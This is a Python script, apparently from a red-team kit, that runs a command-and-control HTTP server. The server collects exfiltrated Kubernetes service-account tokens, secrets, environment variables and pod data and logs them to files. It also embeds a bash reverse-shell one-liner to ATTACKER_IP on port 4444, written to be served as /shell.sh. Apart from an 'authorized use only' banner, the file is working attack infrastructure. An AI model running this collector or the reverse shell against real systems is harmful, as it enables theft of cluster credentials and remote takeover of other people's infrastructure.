#!/usr/bin/env python3
"""
Attacker C2 Server for Red Team Exploits
⚠️ AUTHORIZED TESTING ONLY

This server receives exfiltrated data from exploit payloads.
Run before executing exploits to capture results.

Usage:
    python3 attacker-server.py --port 8888
"""

import argparse
import json
import os
import sys
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs


class AttackerHandler(BaseHTTPRequestHandler):
    """HTTP handler for receiving exfiltrated data"""
    
    def _send_response(self, status: int, data: dict):
        """Send JSON response"""
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def _log_data(self, endpoint: str, data: dict):
        """Log received data to file and console"""
        timestamp = datetime.now().isoformat()
        log_entry = {
            'timestamp': timestamp,
            'endpoint': endpoint,
            'source_ip': self.client_address[0],
            'data': data
        }
        
        # Print to console
        print(f"\n{'='*60}")
        print(f"🎯 DATA RECEIVED at {timestamp}")
        print(f"   Endpoint: {endpoint}")
        print(f"   Source: {self.client_address[0]}")
        print(f"   Data: {json.dumps(data, indent=2)[:500]}...")
        print(f"{'='*60}\n")
        
        # Save to file
        log_dir = os.path.join(os.path.dirname(__file__), '..', 'reports')
        os.makedirs(log_dir, exist_ok=True)
        
        log_file = os.path.join(log_dir, f'exfil_{datetime.now().strftime("%Y%m%d")}.json')
        with open(log_file, 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
    
    def do_GET(self):
        """Handle GET requests (beacons, simple exfil)"""
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        endpoint = parsed.path
        data = {k: v[0] if len(v) == 1 else v for k, v in params.items()}
        
        self._log_data(endpoint, data)
        self._send_response(200, {'status': 'received'})
    
    def do_POST(self):
        """Handle POST requests (bulk data exfil)"""
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        
        try:
            data = json.loads(body.decode('utf-8'))
        except json.JSONDecodeError:
            data = {'raw': body.decode('utf-8', errors='replace')}
        
        endpoint = urlparse(self.path).path
        self._log_data(endpoint, data)
        self._send_response(200, {'status': 'received'})
    
    def log_message(self, format, *args):
        """Suppress default logging"""
        pass


def serve_shell_script(handler):
    """Serve a reverse shell script on /shell.sh"""
    shell_script = '''#!/bin/bash
# Reverse shell payload
# Replace ATTACKER_IP and PORT
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
'''
    handler.send_response(200)
    handler.send_header('Content-Type', 'text/plain')
    handler.end_headers()
    handler.wfile.write(shell_script.encode())


def main():
    parser = argparse.ArgumentParser(description='Attacker C2 Server')
    parser.add_argument('--port', type=int, default=8888, help='Port to listen on')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    args = parser.parse_args()
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║           🔴 Red Team C2 Server - AUTHORIZED USE ONLY        ║
╠══════════════════════════════════════════════════════════════╣
║  Listening on: http://{args.host}:{args.port}
║  
║  Endpoints:
║    POST /collect/token    - Receive SA tokens
║    POST /collect/secrets  - Receive K8s secrets
║    POST /collect/env      - Receive environment variables
║    POST /collect/pods     - Receive pod information
║    POST /collect/receiver - Receive receiver mode data
║    GET  /beacon           - Persistence beacon
║    GET  /shell.sh         - Reverse shell script
║  
║  Logs saved to: reports/exfil_YYYYMMDD.json
╚══════════════════════════════════════════════════════════════╝
""")
    
    server = HTTPServer((args.host, args.port), AttackerHandler)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\n🛑 Server stopped")
        sys.exit(0)


if __name__ == '__main__':
    main()
